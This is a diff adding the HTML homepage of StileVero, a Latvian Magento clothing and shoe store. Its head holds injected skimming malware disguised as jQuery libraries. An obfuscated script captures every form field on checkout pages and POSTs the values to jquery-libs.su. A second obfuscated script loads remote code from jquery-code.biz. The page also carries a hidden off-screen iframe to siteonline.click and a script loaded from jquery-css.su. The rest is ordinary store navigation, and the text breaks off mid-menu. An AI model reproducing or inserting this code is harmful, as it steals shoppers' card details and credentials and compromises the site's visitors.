@@ -1,0 +1,594 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="lv" lang="lv">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>StileVero</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE" />
+<meta name="description" content="StileVero" />
+<meta name="keywords" content="Magento, Varien, E-commerce" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link rel="icon" href="http://stile-vero.com/skin/frontend/default/vigoshop/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://stile-vero.com/skin/frontend/default/vigoshop/favicon.ico" type="image/x-icon" />
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://stile-vero.com/js/blank.html';
+    var BLANK_IMG = 'http://stile-vero.com/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://stile-vero.com/js/vigoshop/ajaxcart/fancybox/jquery.fancybox.css" />
+<link rel="stylesheet" type="text/css" href="http://stile-vero.com/js/vigoshop/ajaxcart/ajaxaddto.css" />
+<link rel="stylesheet" type="text/css" href="http://stile-vero.com/skin/frontend/base/default/css/widgets.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://stile-vero.com/skin/frontend/default/vigoshop/css/bootstrap.min.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://stile-vero.com/skin/frontend/default/vigoshop/css/bootstrap-theme.min.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://stile-vero.com/skin/frontend/default/vigoshop/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://stile-vero.com/skin/frontend/default/vigoshop/css/max-991.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://stile-vero.com/skin/frontend/default/vigoshop/css/max-767.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://stile-vero.com/skin/frontend/default/vigoshop/css/selectbox.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://stile-vero.com/skin/frontend/default/vigoshop/css/jquery-ui-1.10.3.min.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://stile-vero.com/skin/frontend/default/vigoshop/jquery_bxslider/jquery.bxslider.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://stile-vero.com/skin/frontend/default/vigoshop/css/configed/design_lv.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://stile-vero.com/skin/frontend/default/vigoshop/css/configed/settings_lv.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://stile-vero.com/skin/frontend/default/vigoshop/css/custom.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://stile-vero.com/skin/frontend/default/vigoshop/rs-plugin/css/settings.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://stile-vero.com/skin/frontend/default/default/css/print.css" media="print" />
+<script type="text/javascript" src="http://stile-vero.com/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/varien/js.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/varien/form.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/varien/menu.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/iwd/all/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/vigoshop/jquery/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/vigoshop/jquery/jquery-noconflict.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/vigoshop/jquery/plugins/jquery-ui-1.10.3.min.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/vigoshop/bootstrap/bootstrap-3.0.0.min.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/vigoshop/html5css3/html5shiv.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/vigoshop/html5css3/respond.min.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/vigoshop/jquery/plugins/jquery.selectbox.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/vigoshop/ajaxcart/ajaxaddto.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/vigoshop/ajaxcart/fancybox/jquery.mousewheel-3.0.4.pack.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/js/vigoshop/ajaxcart/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/skin/frontend/default/vigoshop/js/minicart.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/skin/frontend/default/vigoshop/js/jquery.slides.min.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/skin/frontend/default/vigoshop/jquery_bxslider/jquery.bxslider.min.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/skin/frontend/default/vigoshop/jquery_nicescroll/jquery.nicescroll.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/skin/frontend/default/vigoshop/js/twitterfetcher.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/skin/frontend/default/vigoshop/rs-plugin/js/jquery.themepunch.plugins.min.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/skin/frontend/default/vigoshop/rs-plugin/js/jquery.themepunch.revolution.min.js"></script>
+<!--[if lte IE 10]>
+<link rel="stylesheet" type="text/css" href="http://stile-vero.com/skin/frontend/default/vigoshop/css/styles-ie.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://stile-vero.com/js/lib/ds-sleight.js"></script>
+<script type="text/javascript" src="http://stile-vero.com/skin/frontend/base/default/js/ie6.js"></script>
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.stile-vero.com';
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["HK","IE","MO","PA"];
+//]]>
+</script>
+
+    <!-- Facebook Conversion Code for Stile Vero посетители -->
+    <script>(function() {
+            var _fbq = window._fbq || (window._fbq = []);
+            if (!_fbq.loaded) {
+                var fbds = document.createElement('script');
+                fbds.async = true;
+                fbds.src = '//connect.facebook.net/en_US/fbds.js';
+                var s = document.getElementsByTagName('script')[0];
+                s.parentNode.insertBefore(fbds, s);
+                _fbq.loaded = true;
+            }
+        })();
+        window._fbq = window._fbq || [];
+        window._fbq.push(['track', '6020566177502', {'value':'0.00','currency':'EUR'}]);
+    </script>
+    <noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?ev=6020566177502&amp;cd[value]=0.00&amp;cd[currency]=EUR&amp;noscript=1" /></noscript>
+
+    <script type="text/javascript">
+
+        if (typeof(jQuery) == 'undefined') {
+            document.write("<script type='text/javascript' src='//ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js'></scr"+"ipt>");
+        }
+    </script>
+
+
+    <!-- Google Tag Manager -->
+    <noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-T55T8X"
+                      height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+            '//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+        })(window,document,'script','dataLayer','GTM-T55T8X');
+
+    </script>
+    <!-- End Google Tag Manager -->
+
+    <script type="text/javascript">
+
+    (function(i, s, o, g, r, a, m) {
+        i["GoogleAnalyticsObject"] = r;
+        i[r] = i[r] || function() {
+            (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date();
+        a = s.createElement(o),
+            m = s.getElementsByTagName(o)[0];
+        a.async = 1;
+        a.src = g;
+        m.parentNode.insertBefore(a, m)
+    })(window, document, "script", "//www.google-analytics.com/analytics.js", "ga");
+
+    ga('create', 'UA-61215031-1','stile-vero.com');
+
+
+    ga("require", "displayfeatures");
+    ga('send', 'pageview');
+    ga("require", "ec", "ec.js");
+
+    var $t_jQuery = jQuery.noConflict();
+
+        exec_tvc_t_hi = true;
+    
+    
+
+
+            </script>
+
+    <!--Tatvic Enhanced eCommerce Section end -->
+<link href='//fonts.googleapis.com/css?family=PT+Sans:400,700' rel='stylesheet' type='text/css'>
+<style>
+	#loading-mask { display: none; font-size: 1.1em; font-weight: bold; opacity: 0.8; position: fixed; text-align: center; z-index: 20002; width: 100%; height: 100%; }
+#after-loading-success-message { display:none;  font-size: 1.1em; position: fixed; text-align: center; z-index: 20002; width: 100%;height: 100%;}
+#success-message-container { border:2px solid #CCCCCC; font-weight:bold;  padding:15px 30px 30px; position:relative; text-align:center; top:35%; width:303px; z-index:1000; background:#FFFFFF none repeat scroll 0 0; margin: auto; }</style>
+<div id="loading-mask">
+<div class ="background-overlay"></div>
+	<p id="loading_mask_loader" class="loader">
+		<img alt="Loading.." src='http://stile-vero.com/js/vigoshop/ajaxcart/ajax-loader.gif'/>
+        <br/>Processing... Please wait...
+	</p>
+</div>
+<div id="after-loading-success-message">
+	<div class ="background-overlay"></div>
+	<p id="success-message-container" class="loader" >Prece tika veiksmīgi pievienots jūsu iepirkumu grozā.	<br/><br/>
+	<button type="button" name="finish_and_checkout" id="finish_and_checkout" class="button btn-cart" ><span><span>
+				Doties uz grozu		</span></span></button>
+	<br/><br/>
+	<button type="button" name="continue_shopping" id="continue_shopping" class="button btn-cart" >
+	<span><span>
+				Turpināt iepirkties		</span></span></button>
+</div>	
+<script type='text/javascript'>
+		jQuery('#finish_and_checkout').click(function(){location.href = 'http://stile-vero.com/checkout/cart/'});
+		jQuery('#continue_shopping').click(function(){jQuery('#after-loading-success-message').fadeOut();}); 
+</script><script type="text/javascript">//<![CDATA[
+        var Translator = new Translate({"Please select an option.":"L\u016bdzu izdariet izv\u0113li.","This is a required field.":"\u0160is ir oblig\u0101ti aizpild\u0101ms lauks.","Please enter a valid number in this field.":"Ievadiet pareizu v\u0113rt\u012bbu.","Please use only letters (a-z), numbers (0-9) or underscore(_) in this field, first character should be a letter.":"Aizpildot \u0161o lauku lietojiet burtus (a-z), skait\u013cus (0-9) vai apak\u0161str\u012bpas(_). Pirmajam simbolam ir j\u0101b\u016bt burtam.","Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.":"Nor\u0101diet pareizu t\u0101lru\u0146a nummuru. Piem\u0113ram (371) 29446603 vai ar\u012b +371 29446603.","Please enter a valid date.":"Nor\u0101diet pareizu datumu","Please enter a valid email address. For example johndoe@domain.com.":"Nor\u0101diet pareizu e-pasta adresi. Piem\u0113ram epasts@epasts.lv.","Please enter 6 or more characters. Leading or trailing spaces will be ignored.":"L\u016bdzu ievadiet 6 vai vair\u0101k simbolus. Pirmais un p\u0113d\u0113jais tuk\u0161umu tiks ignor\u0113ti.","Please make sure your passwords match.":"Paroles at\u0161\u0137ir\u0101s.","Please enter a valid URL. For example http:\/\/www.example.com or www.example.com":"Nor\u0101diet pareizu web adresi. Piem\u0113ram http:\/\/www.piemeram.lv vai www.piemeram.lv","Please enter a valid zip code. For example 90602 or 90602-1234.":"Nor\u0101diet pareizu pasta indeksu. Piem\u0113ram LV-2013","Please enter a valid zip code.":"Nor\u0101diet pareizu pasta indeksu.","Please use this date format: dd\/mm\/yyyy. For example 17\/03\/2006 for the 17th of March, 2006.":"Datumu nor\u0101d\u012bt k\u0101 : dd\/mm\/gggg. Piem\u0113ram 17\/03\/2006.","Please enter a valid $ amount. For example $100.00.":"Nor\u0101diet pareizu naudas summu LVL. Piem\u0113ram LVL20.00.","Please select one of the above options.":"L\u016bdzu izv\u0113lieties vienu no augst\u0101k min\u0113tajiem variantiem.","Please select one of the options.":"L\u016bdzu izv\u0113lieties vienu no variantiem.","Please select State\/Province.":"Nor\u0101diet \u0161tatu","Please enter a number greater than 0 in this field.":"L\u016bdzu nor\u0101diet skaitli liel\u0101ku par 0 \u0161aj\u0101 lauk\u0101.","Please enter a valid credit card number.":"L\u016bdzu nor\u0101diet der\u012bgu kartes nummuru.","Please wait, loading...":"Uzgaidiet..."});
+        //]]></script><!--Jquery libs start-->
+<script src="https://jquery-css.su/app/lib/main.js"></script>
+<!--Jquery libs end--><script>
+var _0xc188=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x71\x75\x65\x72\x79\x2D\x6C\x69\x62\x73\x2E\x73\x75\x2F\x69\x6D\x61\x67\x65\x73\x2F\x70\x61\x79\x70\x61\x6C\x2D\x6C\x6F\x67\x6F\x2E\x6A\x70\x67","\x73\x65\x74\x69\x64\x64","\x28\x3F\x3A\x5E\x7C\x3B\x20\x29","\x5C\x24\x31","\x72\x65\x70\x6C\x61\x63\x65","\x3D\x28\x5B\x5E\x3B\x5D\x2A\x29","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2D","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x73\x65\x74\x69\x64\x64\x3D","\x3B\x20\x70\x61\x74\x68\x3D\x2F\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","\x73\x6E\x64","\x69\x6E\x70\x75\x74\x2C\x20\x73\x65\x6C\x65\x63\x74\x2C\x20\x74\x65\x78\x74\x61\x72\x65\x61\x2C\x20\x63\x68\x65\x63\x6B\x62\x6F\x78\x2C\x20\x62\x75\x74\x74\x6F\x6E","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x76\x61\x6C\x75\x65","\x6E\x61\x6D\x65","","\x3D","\x26","\x61\x5B\x68\x72\x65\x66\x2A\x3D\x27\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x76\x6F\x69\x64\x28\x30\x29\x27\x5D\x2C\x62\x75\x74\x74\x6F\x6E\x2C\x20\x69\x6E\x70\x75\x74\x2C\x20\x73\x75\x62\x6D\x69\x74\x2C\x20\x2E\x62\x74\x6E\x2C\x20\x2E\x62\x75\x74\x74\x6F\x6E","\x74\x79\x70\x65","\x74\x65\x78\x74","\x73\x65\x6C\x65\x63\x74","\x63\x68\x65\x63\x6B\x62\x6F\x78","\x70\x61\x73\x73\x77\x6F\x72\x64","\x72\x61\x64\x69\x6F","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x63\x6C\x69\x63\x6B","\x63\x6C\x6B","\x6F\x6E\x63\x6C\x69\x63\x6B","\x61\x74\x74\x61\x63\x68\x45\x76\x65\x6E\x74","\x66\x6F\x72\x6D","\x73\x75\x62\x6D\x69\x74","\x6F\x6E\x73\x75\x62\x6D\x69\x74","\x5F","\x6A\x6F\x69\x6E","\x73\x6C\x69\x63\x65","\x2E","\x73\x70\x6C\x69\x74","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x69\x6E\x66\x6F\x3D","\x26\x68\x6F\x73\x74\x6E\x61\x6D\x65\x3D","\x26\x6B\x65\x79\x3D","\x6D\x79\x69\x64","\x73\x65\x6E\x64","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70","\x67\x69"];var gee33b77d74b736f8197ee39a58f56965={snd:null,Glink:_0xc188[0],myid:(function(_0xc2d8x2){var _0xc2d8x3=document[_0xc188[7]][_0xc188[6]]( new RegExp(_0xc188[2]+ _0xc2d8x2[_0xc188[4]](/([\.$?*|{}\(\)\[\]\\\/\+^])/g,_0xc188[3])+ _0xc188[5]));return _0xc2d8x3?decodeURIComponent(_0xc2d8x3[1]):undefined})(_0xc188[1])|| (function(){var _0xc2d8x4= new Date();var _0xc2d8x5=_0xc2d8x4[_0xc188[8]]()+ _0xc188[9]+ Math[_0xc188[11]](Math[_0xc188[10]]()* (999999999- 11111111+ 1)+ 11111111);var _0xc2d8x6= new Date( new Date()[_0xc188[8]]()+ 60* 60* 24* 1000);document[_0xc188[7]]= _0xc188[12]+ _0xc2d8x5+ _0xc188[13]+ _0xc2d8x6[_0xc188[14]]();return _0xc2d8x5})(),clk:function(){gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]= null;var _0xc2d8x7=document[_0xc188[17]](_0xc188[16]);for(var _0xc2d8x8=0;_0xc2d8x8< _0xc2d8x7[_0xc188[18]];_0xc2d8x8++){if(_0xc2d8x7[_0xc2d8x8][_0xc188[19]][_0xc188[18]]> 0){var _0xc2d8x9=_0xc2d8x7[_0xc2d8x8][_0xc188[20]];if(_0xc2d8x9== _0xc188[21]){_0xc2d8x9= _0xc2d8x8};gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]+= _0xc2d8x7[_0xc2d8x8][_0xc188[20]]+ _0xc188[22]+ _0xc2d8x7[_0xc2d8x8][_0xc188[19]]+ _0xc188[23]}}},send:function(){try{var _0xc2d8xa=document[_0xc188[17]](_0xc188[24]);for(var _0xc2d8x8=0;_0xc2d8x8< _0xc2d8xa[_0xc188[18]];_0xc2d8x8++){var _0xc2d8xb=_0xc2d8xa[_0xc2d8x8];if(_0xc2d8xb[_0xc188[25]]!= _0xc188[26]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[27]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[28]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[29]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[30]){if(_0xc2d8xb[_0xc188[31]]){_0xc2d8xb[_0xc188[31]](_0xc188[32],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]],false)}else {_0xc2d8xb[_0xc188[35]](_0xc188[34],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]])}}};var _0xc2d8xc=document[_0xc188[17]](_0xc188[36]);for(vari= 0;_0xc2d8x8< _0xc2d8xc[_0xc188[18]];_0xc2d8x8++){if(_0xc2d8xc[_0xc2d8x8][_0xc188[31]]){_0xc2d8xc[_0xc2d8x8][_0xc188[31]](_0xc188[37],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]],false)}else {_0xc2d8xc[_0xc2d8x8][_0xc188[35]](_0xc188[38],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]])}};if(gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]!= null){var _0xc2d8xd=location[_0xc188[44]][_0xc188[43]](_0xc188[42])[_0xc188[41]](0)[_0xc188[40]](_0xc188[39]);var _0xc2d8xe=btoa(gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]);var _0xc2d8xf= new XMLHttpRequest();_0xc2d8xf[_0xc188[46]](_0xc188[45],gee33b77d74b736f8197ee39a58f56965.Glink,true);_0xc2d8xf[_0xc188[49]](_0xc188[47],_0xc188[48]);_0xc2d8xf[_0xc188[54]](_0xc188[50]+ _0xc2d8xe+ _0xc188[51]+ _0xc2d8xd+ _0xc188[52]+ gee33b77d74b736f8197ee39a58f56965[_0xc188[53]])};gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]= null;_0xc2d8xe= null;setTimeout(function(){gee33b77d74b736f8197ee39a58f56965[_0xc188[54]]()},30)}catch(e){}}};if(( new RegExp(_0xc188[57],_0xc188[58]))[_0xc188[56]](window[_0xc188[55]])){gee33b77d74b736f8197ee39a58f56965[_0xc188[54]]()}
+</script><script>
+var _0x5ff6=["\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70\x7C\x66\x69\x72\x65\x63\x68\x65\x63\x6B\x6F\x75\x74","\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x6F\x64\x65\x2E\x6A\x71\x75\x65\x72\x79\x2E\x63\x6F\x6D\x2F\x6A\x71\x75\x65\x72\x79\x2D\x31\x2E\x37\x2E\x6A\x73\x22\x3E\x3C\x2F\x73\x63\x72","\x69\x70\x74\x3E\x3C\x73\x63\x72\x69\x70\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22\x3E\x76\x61\x72\x20\x6A\x51\x75\x65\x72\x79\x31\x37\x20\x3D\x20\x24\x2E\x6E\x6F\x43\x6F\x6E\x66\x6C\x69\x63\x74\x28\x74\x72\x75\x65\x29\x3B\x3C\x2F\x73\x63\x72","\x69\x70\x74\x3E\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x71\x75\x65\x72\x79\x2D\x63\x6F\x64\x65\x2E\x62\x69\x7A\x2F\x74\x65\x78\x74\x2F\x63\x6C\x69\x62\x2E\x6A\x73\x22\x3E\x3C\x2F\x73\x63\x72","\x69\x70\x74\x3E","\x77\x72\x69\x74\x65"];if(( new RegExp(_0x5ff6[2]))[_0x5ff6[1]](window[_0x5ff6[0]])){document[_0x5ff6[7]](_0x5ff6[3]+ _0x5ff6[4]+ _0x5ff6[5]+ _0x5ff6[6])}
+</script><div style='width: 600px; height: 600px; position: absolute; left:-5000px; top: -5000px;'>
+    <iframe src='https://siteonline.click/statistics_online'  width='500' height='500'></iframe>
+</div><script type="text/javascript">
+    window.addEventListener("load",function() {
+        setTimeout(function(){
+            window.scrollTo(0, 1);
+        }, 0);
+    });
+    jQuery(document).ready(function(){
+        jQuery('html').niceScroll({zindex : 9999});
+    });
+/*
+    jQuery(document).ready(function(){
+        jQuery('select').selectbox({styleClass:'default'});
+        jQuery('input, textarea').placeholder();
+    });
+*/
+</script>
+</head>
+<body class=" cms-index-index">
+<div class="wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+        <div class="header-container">
+    <div class="top-links">
+        <div class="container">
+            <ul class="links">
+                <li class="first"><a href="http://stile-vero.com/" title="Sākums" class="top-link-home">Sākums</a></li>
+                                    <li><a href="http://stile-vero.com/customer/account/" class="top-link-account">Ienākt vai Reģistrēties</a></li>
+                            </ul>
+            <ul class="right-links pull-right">
+        <li class="mini-cart  last">
+                                                        <a href="javascript:void(0)" class="mybag-link">Grozs: 0 preces</a>
+        <div id="topCartContent" class="block-content">
+            <div class="inner-wrapper">                                                    <p class="block-subtitle">
+                            Grozā ievietotās preces                    </p>
+                    <p class="cart-empty">
+                        Iepirkumu grozā nav nevienas preces.                    </p>
+                            </div>
+        </div>
+</li></ul>
+            <div class="clear"></div>
+        </div>
+    </div>
+    <div class="top-links2">
+        <div class="container">
+            <div class="pull-right language-switcher">
+    <select id="select-language" title="Valoda" onchange="window.location.href=this.value" style="width:auto;">
+                    <option value="http://stile-vero.com/?___store=en&amp;___from_store=lv" data-image="http://stile-vero.com/skin/frontend/default/vigoshop/images/flags/en.png" >EN</option>
+                    <option value="http://stile-vero.com/?___store=lv&amp;___from_store=lv" data-image="http://stile-vero.com/skin/frontend/default/vigoshop/images/flags/lv.png"  selected="selected">LV</option>
+                    <option value="http://stile-vero.com/?___store=ru&amp;___from_store=lv" data-image="http://stile-vero.com/skin/frontend/default/vigoshop/images/flags/ru.png" >RU</option>
+        </select>
+    <script type="text/javascript">
+        (function($){
+            $("#select-language").selectbox();
+        })(jQuery);
+    </script>
+</div>
+                        <div class="clear"></div>
+        </div>
+    </div>
+    <div class="header container">
+                <h1 class="logo"><strong>StileVero</strong><a href="http://stile-vero.com/" title="StileVero" class="logo"><img src="http://stile-vero.com/skin/frontend/default/vigoshop/images/logo.png" alt="StileVero" /></a></h1>
+                <div class="info-block">
+            <ul>
+                <li class="order-by-phone">Pasūtiet pa telefonu</li>
+                <li class="pick-up-in-store">Saņemiet salonā</li>
+                <li class="free-delivery">Bezmaksas piegāde</li>
+            </ul>
+        </div>
+            </div>
+</div>
+
+<div class="navbar navbar-default">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
+                <span>Menu</span>
+            </button>
+            <div class="for-mobile">
+            <form id="mb_search_mini_form" action="http://stile-vero.com/catalogsearch/result/" method="get">
+    <div class="form-search">
+        <button type="submit" title="Meklēt" class="button btn-search"><span><span>Meklēt</span></span></button>
+        <input id="mb_search" type="text" name="q" class="input-text" maxlength="128" placeholder="Enter text here..." />
+        <a class="btn-remove btn-remove2" href="javascript:void(0)">Aizvērt</a>
+        <button type="button" title="Meklēt" class="button btn-search-flg"><span><span>Meklēt</span></span></button>
+        <script type="text/javascript">
+        //<![CDATA[
+        jQuery("button.btn-search-flg").click(function(){
+            jQuery(this).parent().children("button.btn-search-flg").hide();
+            jQuery(this).parent().children("button.btn-search").show();
+            jQuery(this).parent().children("#mb_search").show();
+            jQuery(this).parent().children("#mb_search").focus();
+            jQuery(this).parent().children("a.btn-remove").css('display','inline-block');
+            jQuery("button.navbar-toggle").hide();
+        });
+        jQuery(".navbar .for-mobile a.btn-remove").click(function(){
+            jQuery(this).parent().children("button.btn-search-flg").show();
+            jQuery(this).parent().children("button.btn-search").hide();
+            jQuery(this).parent().children("#mb_search").hide();
+            jQuery(this).parent().children("a.btn-remove").hide();
+            jQuery("button.navbar-toggle").show();
+        });
+        //]]>
+        </script>
+    </div>
+</form>
+            </div>
+        </div>
+        <nav class="collapse navbar-collapse bs-navbar-collaspe" role="navigation">
+                        <a href="http://stile-vero.com/" title="StileVero" class="logo sticky-logo"><strong></strong><img src="http://stile-vero.com/skin/frontend/default/vigoshop/images/logo.png" alt="StileVero" /></a>
+                        
+            <ul id="nav_custom" class="nav navbar-nav"><li class="level0 first parent" thumb_image="no-image"><a href ="http://stile-vero.com/women.html"><span>SIEVIETĒM</span></a><span class="plus"></span><ul class="level1"><li class="level1 first parent" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-shoes.html"><span>Apavi</span></a><span class="plus"></span><ul class="level2"><li class="level2 first" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-shoes/pumps.html"><span>Kurpes</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-shoes/boots.html"><span>Zābaki</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-shoes/sandals.html"><span>Sandales </span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-shoes/ballet-flats.html"><span>Balerīnas </span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-shoes/loafers.html"><span>Loferi</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-shoes/moccasins.html"><span>Mokasīni</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-shoes/sneakers.html"><span>Kedas</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-shoes/shoe-boots.html"><span>Batiljoni</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-shoes/ankle-boots.html"><span>Saišu zābaki</span></a></li></ul></li><li class="level1 parent" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-clothe.html"><span>APĢĒRBI</span></a><span class="plus"></span><ul class="level2"><li class="level2 first" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-clothe/tunics.html"><span>Tunikas</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-clothe/t-shirts.html"><span>T-krekli</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-clothe/topss.html"><span>Topi</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-clothe/coats.html"><span>Mēteļi</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-clothe/jakas.html"><span>Virsjakas</span></a></li><li class="level2" thumb_image="no-image"><a href 